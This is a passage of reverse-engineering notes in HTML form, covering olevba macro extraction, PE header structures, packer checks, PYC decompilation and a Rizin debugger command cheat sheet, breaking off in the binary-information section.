+<p>Download the <strong><a href="https://github.com/decalage2/oletools">Oletools</a></strong> to use it.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>olevba<span class="w"> </span>example.docm
+</span></code></pre></div>
+<p>Copy the above Visual Basic code, and access to <strong><a href="https://onecompiler.com/">OneCompiler</a></strong>.<br />
+Select the programming language "Visual Basic".<br />
+Paste the copied code to the editor, then click Run.</p>
+<hr />
+<p>title: Reversing PE (Portable Executable)
+description: The Portable Executable format is a file format for executables, object code, DLLs and others used in 32-bit and 64-bit versions of Windows.
+tags:
+    - Reverse Engineering
+    - Windows
+refs:
+date: 2024-02-18
+draft: false</p>
+<hr />
+<h2 id="pe-headers">PE Headers</h2>
+<p>There are many tools to analyze PE headers, such as <code>wxHexEditor</code>, <code>pe-tree</code>.<br />
+<a href="https://github.com/blackberry/pe_tree">pe-tree</a> is a tool that views PE files in a tree-view. It will take about a few minutes to open.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>pe-tree<span class="w"> </span>./executable
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Structure</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IMAGE_DOS_HEADER</td>
+<td>It consists of the first 64 bytes of the PE file. The first two bytes (”4D 5A”) means the “MZ” characters which are an identity of the Portable Executable format.</td>
+</tr>
+<tr>
+<td>DOS_STUB</td>
+<td>It is a small piece of code that only runs if the PE file is incompatible with the system it is being run on. At such time the message “!This program cannot be run in DOS mode" will be displayed.</td>
+</tr>
+<tr>
+<td>IMAGE_NT_HEADERS</td>
+<td>It contains most of the vital information related to the PE file. The starting address of the IMAGE_NT_HEADERS is found in <code>e_lfanew</code> from the IMAGE_DOS_HEADER. It contains <code>NT_HEADERS</code>, <code>IMAGE_SECTION_HEADER</code>, <code>IMAGE_IMPORT_DESCRIPTION</code></td>
+</tr>
+</tbody>
+</table>
+<p><br /></p>
+<h2 id="identify-packers-of-packed-executable">Identify Packers of Packed Executable</h2>
+<p><a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/pecheck.py">pecheck</a> is a command-line tool which analyze PE files.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>pecheck<span class="w"> </span>./executable
+</span></code></pre></div>
+<p>When results appears, check the section name in the PE Section.</p>
+<p><br /></p>
+<h2 id="debugging_1">Debugging</h2>
+<ul>
+<li><a href="https://dogbolt.org/">Decompiler Explorer</a></li>
+<li>dnSpy</li>
+<li>ILSpy</li>
+<li><a href="https://github.com/icsharpcode/AvaloniaILSpy">AnaloniaILSpy</a></li>
+<li>Cutter</li>
+<li>Ghidra</li>
+<li>Binary Ninja</li>
+</ul>
+<hr />
+<p>title: Reversing PYC (Python Compiled File)
+description: A PYC file is a compiled file generated from source code written in Python.
+tags:
+    - Reverse Engineering
+refs:
+date: 2023-02-18
+draft: false</p>
+<hr />
+<h2 id="decompile">Decompile</h2>
+<p><a href="https://github.com/rocky/python-uncompyle6/">uncompyle6</a> is a PYC decompiler.</p>
+<p>We can install easily using pip.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>pip<span class="w"> </span>install<span class="w"> </span>uncompyle6
+</span></code></pre></div>
+<p>Then decompile the pyc file.</p>
+<h2 id="uncompyle6-examplepyc"><div class="language-bash highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>uncompyle6<span class="w"> </span>example.pyc
+</span></code></pre></div></h2>
+<p>title: Rizin Cheat Sheet
+description: Rizin is a reverse engineering framework forked from Radare2.
+tags:
+    - Malware
+    - Reverse Engineering
+refs:
+date: 2024-02-18
+draft: false</p>
+<hr />
+<h2 id="using-cutter">*Using Cutter</h2>
+<p>Cutter is a GUI tool for reverse engineering powered by Rizin.<br />
+It can also have a decompiler, so it’s recommended to use it first.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>cutter<span class="w"> </span>&lt;file&gt;
+</span></code></pre></div>
+<p>To use the Ghidra decompiler, install the package.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>rizin-plugin-ghidra
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a><span class="c1"># or</span>
+</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>rz-ghidra
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="start-debugging">Start Debugging</h2>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>rizin<span class="w"> </span>./example
+</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>
+</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a><span class="c1"># Debug mode</span>
+</span><span id="__span-57-4"><a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a>rizin<span class="w"> </span>-d<span class="w"> </span>./example
+</span><span id="__span-57-5"><a id="__codelineno-57-5" name="__codelineno-57-5" href="#__codelineno-57-5"></a><span class="c1"># Write mode</span>
+</span><span id="__span-57-6"><a id="__codelineno-57-6" name="__codelineno-57-6" href="#__codelineno-57-6"></a>rizin<span class="w"> </span>-w<span class="w"> </span>./example
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="analyze">Analyze</h2>
+<p>Analyze the program after starting the debugger.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="c1"># Analyze all calls</span>
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>&gt;<span class="w"> </span>aaa
+</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a>
+</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a><span class="c1"># Analyze function</span>
+</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a>&gt;<span class="w"> </span>af<span class="w"> </span>
+</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a><span class="c1"># List all functions</span>
+</span><span id="__span-58-7"><a id="__codelineno-58-7" name="__codelineno-58-7" href="#__codelineno-58-7"></a>&gt;<span class="w"> </span>afl
+</span><span id="__span-58-8"><a id="__codelineno-58-8" name="__codelineno-58-8" href="#__codelineno-58-8"></a>&gt;<span class="w"> </span>afl<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>main
+</span><span id="__span-58-9"><a id="__codelineno-58-9" name="__codelineno-58-9" href="#__codelineno-58-9"></a><span class="c1"># Show address of current function</span>
+</span><span id="__span-58-10"><a id="__codelineno-58-10" name="__codelineno-58-10" href="#__codelineno-58-10"></a>&gt;<span class="w"> </span>afo
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="print-usage">Print Usage</h2>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="c1"># Print usage</span>
+</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>&gt;<span class="w"> </span>?
+</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a>
+</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a><span class="c1"># Add &quot;?&quot; suffix to print the usage of the specific command.</span>
+</span><span id="__span-59-5"><a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a>&gt;<span class="w"> </span>i?
+</span><span id="__span-59-6"><a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a>&gt;<span class="w"> </span>p?
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="visual-mode">Visual Mode</h2>
+<p>You can enter visual mode for more intuitive operation.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>&gt;<span class="w"> </span>v
+</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>
+</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a><span class="c1"># Visual Debugger Mode</span>
+</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a>&gt;<span class="w"> </span>Vpp
+</span></code></pre></div>
+<p>Below is a list of basic commands:</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="c1"># Toggle print mode</span>
+</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>p
+</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a><span class="c1"># or</span>
+</span><span id="__span-61-4"><a id="__codelineno-61-4" name="__codelineno-61-4" href="#__codelineno-61-4"></a>P
+</span><span id="__span-61-5"><a id="__codelineno-61-5" name="__codelineno-61-5" href="#__codelineno-61-5"></a>
+</span><span id="__span-61-6"><a id="__codelineno-61-6" name="__codelineno-61-6" href="#__codelineno-61-6"></a><span class="c1"># Step</span>
+</span><span id="__span-61-7"><a id="__codelineno-61-7" name="__codelineno-61-7" href="#__codelineno-61-7"></a>s
+</span><span id="__span-61-8"><a id="__codelineno-61-8" name="__codelineno-61-8" href="#__codelineno-61-8"></a>
+</span><span id="__span-61-9"><a id="__codelineno-61-9" name="__codelineno-61-9" href="#__codelineno-61-9"></a><span class="c1"># Toggle cursor mode</span>
+</span><span id="__span-61-10"><a id="__codelineno-61-10" name="__codelineno-61-10" href="#__codelineno-61-10"></a>c
+</span><span id="__span-61-11"><a id="__codelineno-61-11" name="__codelineno-61-11" href="#__codelineno-61-11"></a>
+</span><span id="__span-61-12"><a id="__codelineno-61-12" name="__codelineno-61-12" href="#__codelineno-61-12"></a><span class="c1"># Exit</span>
+</span><span id="__span-61-13"><a id="__codelineno-61-13" name="__codelineno-61-13" href="#__codelineno-61-13"></a>q
+</span><span id="__span-61-14"><a id="__codelineno-61-14" name="__codelineno-61-14" href="#__codelineno-61-14"></a>
+</span><span id="__span-61-15"><a id="__codelineno-61-15" name="__codelineno-61-15" href="#__codelineno-61-15"></a><span class="c1"># Enable regular rizin commands</span>
+</span><span id="__span-61-16"><a id="__codelineno-61-16" name="__codelineno-61-16" href="#__codelineno-61-16"></a>:
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="debug_1">Debug</h2>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="c1"># Step</span>
+</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>&gt;<span class="w"> </span>ds
+</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a><span class="c1"># Step 3 times</span>
+</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a>&gt;<span class="w"> </span>ds<span class="w"> </span><span class="m">3</span>
+</span><span id="__span-62-5"><a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a><span class="c1"># Step back</span>
+</span><span id="__span-62-6"><a id="__codelineno-62-6" name="__codelineno-62-6" href="#__codelineno-62-6"></a>&gt;<span class="w"> </span>dsb
+</span><span id="__span-62-7"><a id="__codelineno-62-7" name="__codelineno-62-7" href="#__codelineno-62-7"></a>
+</span><span id="__span-62-8"><a id="__codelineno-62-8" name="__codelineno-62-8" href="#__codelineno-62-8"></a><span class="c1"># Setup a breakpoint</span>
+</span><span id="__span-62-9"><a id="__codelineno-62-9" name="__codelineno-62-9" href="#__codelineno-62-9"></a>&gt;<span class="w"> </span>db<span class="w"> </span>@<span class="w"> </span>0x8048920
+</span><span id="__span-62-10"><a id="__codelineno-62-10" name="__codelineno-62-10" href="#__codelineno-62-10"></a><span class="c1"># Remove a breakpoint</span>
+</span><span id="__span-62-11"><a id="__codelineno-62-11" name="__codelineno-62-11" href="#__codelineno-62-11"></a>&gt;<span class="w"> </span>db<span class="w"> </span>@<span class="w"> </span>-0x8048920
+</span><span id="__span-62-12"><a id="__codelineno-62-12" name="__codelineno-62-12" href="#__codelineno-62-12"></a><span class="c1"># Remove all breakpoints</span>
+</span><span id="__span-62-13"><a id="__codelineno-62-13" name="__codelineno-62-13" href="#__codelineno-62-13"></a>&gt;<span class="w"> </span>db-*
+</span><span id="__span-62-14"><a id="__codelineno-62-14" name="__codelineno-62-14" href="#__codelineno-62-14"></a><span class="c1"># List all breakpoints</span>
+</span><span id="__span-62-15"><a id="__codelineno-62-15" name="__codelineno-62-15" href="#__codelineno-62-15"></a>&gt;<span class="w"> </span>dbl
+</span><span id="__span-62-16"><a id="__codelineno-62-16" name="__codelineno-62-16" href="#__codelineno-62-16"></a>
+</span><span id="__span-62-17"><a id="__codelineno-62-17" name="__codelineno-62-17" href="#__codelineno-62-17"></a><span class="c1"># Continue to execute the program until we hit the breakpoint</span>
+</span><span id="__span-62-18"><a id="__codelineno-62-18" name="__codelineno-62-18" href="#__codelineno-62-18"></a>&gt;<span class="w"> </span>dc
+</span><span id="__span-62-19"><a id="__codelineno-62-19" name="__codelineno-62-19" href="#__codelineno-62-19"></a><span class="c1"># Continue until syscall</span>
+</span><span id="__span-62-20"><a id="__codelineno-62-20" name="__codelineno-62-20" href="#__codelineno-62-20"></a>&gt;<span class="w"> </span>dcs
+</span><span id="__span-62-21"><a id="__codelineno-62-21" name="__codelineno-62-21" href="#__codelineno-62-21"></a>
+</span><span id="__span-62-22"><a id="__codelineno-62-22" name="__codelineno-62-22" href="#__codelineno-62-22"></a><span class="c1"># Read all registers values</span>
+</span><span id="__span-62-23"><a id="__codelineno-62-23" name="__codelineno-62-23" href="#__codelineno-62-23"></a>&gt;<span class="w"> </span>dr
+</span><span id="__span-62-24"><a id="__codelineno-62-24" name="__codelineno-62-24" href="#__codelineno-62-24"></a>&gt;<span class="w"> </span><span class="nv">dr</span><span class="o">=</span>
+</span><span id="__span-62-25"><a id="__codelineno-62-25" name="__codelineno-62-25" href="#__codelineno-62-25"></a><span class="c1"># Read given register value</span>
+</span><span id="__span-62-26"><a id="__codelineno-62-26" name="__codelineno-62-26" href="#__codelineno-62-26"></a>&gt;<span class="w"> </span>dr<span class="w"> </span>eip
+</span><span id="__span-62-27"><a id="__codelineno-62-27" name="__codelineno-62-27" href="#__codelineno-62-27"></a>&gt;<span class="w"> </span>dr<span class="w"> </span>rip
+</span><span id="__span-62-28"><a id="__codelineno-62-28" name="__codelineno-62-28" href="#__codelineno-62-28"></a><span class="c1"># Set a register value</span>
+</span><span id="__span-62-29"><a id="__codelineno-62-29" name="__codelineno-62-29" href="#__codelineno-62-29"></a>&gt;<span class="w"> </span>dr<span class="w"> </span><span class="nv">eax</span><span class="o">=</span><span class="m">24</span>
+</span><span id="__span-62-30"><a id="__codelineno-62-30" name="__codelineno-62-30" href="#__codelineno-62-30"></a><span class="c1"># Show register references</span>
+</span><span id="__span-62-31"><a id="__codelineno-62-31" name="__codelineno-62-31" href="#__codelineno-62-31"></a>&gt;<span class="w"> </span>drr
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="seek">Seek</h2>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="c1"># Print current address</span>
+</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a>&gt;<span class="w"> </span>s
+</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a>
+</span><span id="__span-63-4"><a id="__codelineno-63-4" name="__codelineno-63-4" href="#__codelineno-63-4"></a><span class="c1"># Seek to given function</span>
+</span><span id="__span-63-5"><a id="__codelineno-63-5" name="__codelineno-63-5" href="#__codelineno-63-5"></a>&gt;<span class="w"> </span>s<span class="w"> </span>main
+</span><span id="__span-63-6"><a id="__codelineno-63-6" name="__codelineno-63-6" href="#__codelineno-63-6"></a>&gt;<span class="w"> </span>s<span class="w"> </span>sym.main
+</span><span id="__span-63-7"><a id="__codelineno-63-7" name="__codelineno-63-7" href="#__codelineno-63-7"></a>
+</span><span id="__span-63-8"><a id="__codelineno-63-8" name="__codelineno-63-8" href="#__codelineno-63-8"></a><span class="c1"># Seek to given address</span>
+</span><span id="__span-63-9"><a id="__codelineno-63-9" name="__codelineno-63-9" href="#__codelineno-63-9"></a>&gt;<span class="w"> </span>s<span class="w"> </span>0x1360
+</span><span id="__span-63-10"><a id="__codelineno-63-10" name="__codelineno-63-10" href="#__codelineno-63-10"></a>&gt;<span class="w"> </span>s<span class="w"> </span>0x0x00001360
+</span><span id="__span-63-11"><a id="__codelineno-63-11" name="__codelineno-63-11" href="#__codelineno-63-11"></a>
+</span><span id="__span-63-12"><a id="__codelineno-63-12" name="__codelineno-63-12" href="#__codelineno-63-12"></a><span class="c1"># Seek to register address</span>
+</span><span id="__span-63-13"><a id="__codelineno-63-13" name="__codelineno-63-13" href="#__codelineno-63-13"></a>&gt;<span class="w"> </span>s<span class="w"> </span>esp
+</span><span id="__span-63-14"><a id="__codelineno-63-14" name="__codelineno-63-14" href="#__codelineno-63-14"></a>&gt;<span class="w"> </span>s<span class="w"> </span>esp+0x40
+</span><span id="__span-63-15"><a id="__codelineno-63-15" name="__codelineno-63-15" href="#__codelineno-63-15"></a>&gt;<span class="w"> </span>s<span class="w"> </span>rsp
+</span><span id="__span-63-16"><a id="__codelineno-63-16" name="__codelineno-63-16" href="#__codelineno-63-16"></a>&gt;<span class="w"> </span>s<span class="w"> </span>rsp+0x40
+</span><span id="__span-63-17"><a id="__codelineno-63-17" name="__codelineno-63-17" href="#__codelineno-63-17"></a>
+</span><span id="__span-63-18"><a id="__codelineno-63-18" name="__codelineno-63-18" href="#__codelineno-63-18"></a><span class="c1"># Seek 8 positions</span>
+</span><span id="__span-63-19"><a id="__codelineno-63-19" name="__codelineno-63-19" href="#__codelineno-63-19"></a>&gt;<span class="w"> </span>sd<span class="w"> </span><span class="m">8</span>
+</span><span id="__span-63-20"><a id="__codelineno-63-20" name="__codelineno-63-20" href="#__codelineno-63-20"></a>
+</span><span id="__span-63-21"><a id="__codelineno-63-21" name="__codelineno-63-21" href="#__codelineno-63-21"></a><span class="c1"># Show the seek history</span>
+</span><span id="__span-63-22"><a id="__codelineno-63-22" name="__codelineno-63-22" href="#__codelineno-63-22"></a>&gt;<span class="w"> </span>sh
+</span><span id="__span-63-23"><a id="__codelineno-63-23" name="__codelineno-63-23" href="#__codelineno-63-23"></a><span class="c1"># Undoing</span>
+</span><span id="__span-63-24"><a id="__codelineno-63-24" name="__codelineno-63-24" href="#__codelineno-63-24"></a>&gt;<span class="w"> </span>shu
+</span><span id="__span-63-25"><a id="__codelineno-63-25" name="__codelineno-63-25" href="#__codelineno-63-25"></a><span class="c1"># Redoing</span>
+</span><span id="__span-63-26"><a id="__codelineno-63-26" name="__codelineno-63-26" href="#__codelineno-63-26"></a>&gt;<span class="w"> </span>shr
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="print">Print</h2>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="c1"># Disassemble at current address</span>
+</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a>&gt;<span class="w"> </span>pd
+</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a><span class="c1"># Disassemble 10 instructions at current address</span>
+</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a>&gt;<span class="w"> </span>pd<span class="w"> </span><span class="m">10</span>
+</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a><span class="c1"># Disassemble all possible opcodes at current address</span>
+</span><span id="__span-64-6"><a id="__codelineno-64-6" name="__codelineno-64-6" href="#__codelineno-64-6"></a>&gt;<span class="w"> </span>pda
+</span><span id="__span-64-7"><a id="__codelineno-64-7" name="__codelineno-64-7" href="#__codelineno-64-7"></a><span class="c1"># Disassemble all possible opcodes 10 instructions at current address</span>
+</span><span id="__span-64-8"><a id="__codelineno-64-8" name="__codelineno-64-8" href="#__codelineno-64-8"></a>&gt;<span class="w"> </span>pda<span class="w"> </span><span class="m">10</span>
+</span><span id="__span-64-9"><a id="__codelineno-64-9" name="__codelineno-64-9" href="#__codelineno-64-9"></a><span class="c1"># Disassemble at the given function</span>
+</span><span id="__span-64-10"><a id="__codelineno-64-10" name="__codelineno-64-10" href="#__codelineno-64-10"></a>&gt;<span class="w"> </span>pd<span class="w"> </span>@<span class="w"> </span>main
+</span><span id="__span-64-11"><a id="__codelineno-64-11" name="__codelineno-64-11" href="#__codelineno-64-11"></a>&gt;<span class="w"> </span>pd<span class="w"> </span><span class="m">20</span><span class="w"> </span>@<span class="w"> </span>main
+</span><span id="__span-64-12"><a id="__codelineno-64-12" name="__codelineno-64-12" href="#__codelineno-64-12"></a>
+</span><span id="__span-64-13"><a id="__codelineno-64-13" name="__codelineno-64-13" href="#__codelineno-64-13"></a><span class="c1"># Disassemble a function at current address</span>
+</span><span id="__span-64-14"><a id="__codelineno-64-14" name="__codelineno-64-14" href="#__codelineno-64-14"></a>&gt;<span class="w"> </span>pdf
+</span><span id="__span-64-15"><a id="__codelineno-64-15" name="__codelineno-64-15" href="#__codelineno-64-15"></a><span class="c1"># Disassemble at given address</span>
+</span><span id="__span-64-16"><a id="__codelineno-64-16" name="__codelineno-64-16" href="#__codelineno-64-16"></a>&gt;<span class="w"> </span>pdf<span class="w"> </span>@<span class="w"> </span>0x401005
+</span><span id="__span-64-17"><a id="__codelineno-64-17" name="__codelineno-64-17" href="#__codelineno-64-17"></a><span class="c1"># Disassemble the main function</span>
+</span><span id="__span-64-18"><a id="__codelineno-64-18" name="__codelineno-64-18" href="#__codelineno-64-18"></a>&gt;<span class="w"> </span>pdf<span class="w"> </span>@<span class="w"> </span>main
+</span><span id="__span-64-19"><a id="__codelineno-64-19" name="__codelineno-64-19" href="#__codelineno-64-19"></a>
+</span><span id="__span-64-20"><a id="__codelineno-64-20" name="__codelineno-64-20" href="#__codelineno-64-20"></a><span class="c1"># Print string</span>
+</span><span id="__span-64-21"><a id="__codelineno-64-21" name="__codelineno-64-21" href="#__codelineno-64-21"></a>&gt;<span class="w"> </span>ps<span class="w"> </span>@<span class="w"> </span>0x2100
+</span><span id="__span-64-22"><a id="__codelineno-64-22" name="__codelineno-64-22" href="#__codelineno-64-22"></a><span class="c1"># Print zero-terminated string</span>
+</span><span id="__span-64-23"><a id="__codelineno-64-23" name="__codelineno-64-23" href="#__codelineno-64-23"></a>&gt;<span class="w"> </span>psz<span class="w"> </span>@0x2100
+</span><span id="__span-64-24"><a id="__codelineno-64-24" name="__codelineno-64-24" href="#__codelineno-64-24"></a>
+</span><span id="__span-64-25"><a id="__codelineno-64-25" name="__codelineno-64-25" href="#__codelineno-64-25"></a><span class="c1"># Show 200 hex bytes</span>
+</span><span id="__span-64-26"><a id="__codelineno-64-26" name="__codelineno-64-26" href="#__codelineno-64-26"></a>&gt;<span class="w"> </span>px<span class="w"> </span><span class="m">200</span>
+</span><span id="__span-64-27"><a id="__codelineno-64-27" name="__codelineno-64-27" href="#__codelineno-64-27"></a><span class="c1"># Show hex bytes at given register</span>
+</span><span id="__span-64-28"><a id="__codelineno-64-28" name="__codelineno-64-28" href="#__codelineno-64-28"></a>&gt;<span class="w"> </span>px<span class="w"> </span>@<span class="w"> </span>eip
+</span><span id="__span-64-29"><a id="__codelineno-64-29" name="__codelineno-64-29" href="#__codelineno-64-29"></a>&gt;<span class="w"> </span>px<span class="w"> </span>@<span class="w"> </span>esp
+</span></code></pre></div>
+<p>To decompile functions, we need to Ghidra decompiler so first we need to install the ghidra plugin.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>rizin-plugin-ghidra
+</span></code></pre></div>
+<p>Then below are commands for decompiling.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a><span class="c1"># Decompile the &quot;main&quot; function</span>
+</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>&gt;<span class="w"> </span>pdg<span class="w"> </span>@<span class="w"> </span>main
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="write">Write</h2>
+<p>We need to add '-w' option when the debugger starts.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="c1"># Write string</span>
+</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a>&gt;<span class="w"> </span>w<span class="w"> </span>Hello<span class="w"> </span>World<span class="se">\n</span><span class="w"> </span>@<span class="w"> </span>0x2100
+</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a>
+</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a><span class="c1"># Write opcodes at given address</span>
+</span><span id="__span-67-5"><a id="__codelineno-67-5" name="__codelineno-67-5" href="#__codelineno-67-5"></a>&gt;<span class="w"> </span>wa<span class="w"> </span><span class="s1">&#39;mov eax, 1&#39;</span><span class="w"> </span>@<span class="w"> </span>0x2100
+</span><span id="__span-67-6"><a id="__codelineno-67-6" name="__codelineno-67-6" href="#__codelineno-67-6"></a>&gt;<span class="w"> </span>wa<span class="w"> </span><span class="s1">&#39;mov byte [rbp-0x1], 0x61&#39;</span><span class="w"> </span>@<span class="w"> </span>0x2100
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="expressions">Expressions</h2>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>&gt;<span class="w"> </span>?vi<span class="w"> </span>0x000011a4
+</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a><span class="m">4516</span>
+</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a>
+</span><span id="__span-68-4"><a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a>&gt;<span class="w"> </span>?vi<span class="w"> </span><span class="m">1</span>+2
+</span><span id="__span-68-5"><a id="__codelineno-68-5" name="__codelineno-68-5" href="#__codelineno-68-5"></a><span class="m">3</span>
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="information-about-binary-file">Information about Binary File</h2>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="c1"># Information about the binary file</span>
+</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>&gt;<span class="w"> </span>i
+</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a>
+</span><span id="__span-69-4"><a id="__codelineno-69-4" name="__codelineno-69-4" href="#__codelineno-69-4"></a><span class="c1"># All summary</span>
+</span><span id="__span-69-5"><a id="__codelineno-69-5" name="__codelineno-69-5" href="#__codelineno-69-5"></a>&gt;<span class="w"> </span>ia
+</span><span id="__span-69-6"><a id="__codelineno-69-6" name="__codelineno-69-6" href="#__codelineno-69-6"></a>
+</span><span id="__span-69-7"><a id="__codelineno-69-7" name="__codelineno-69-7" href="#__codelineno-69-7"></a><span class="c1"># Show main address</span>
+</span><span id="__span-69-8"><a id="__codelineno-69-8" name="__codelineno-69-8" href="#__codelineno-69-8"></a>&gt;<span class="w"> </span>iM
+</span><span id="__span-69-9"><a id="__codelineno-69-9" name="__codelineno-69-9" href="#__codelineno-69-9"></a>
+</span><span id="__span-69-10"><a id="__codelineno-69-10" name="__codelineno-69-10" href="#__codelineno-69-10"></a><span class="c1"># Symbols</span>
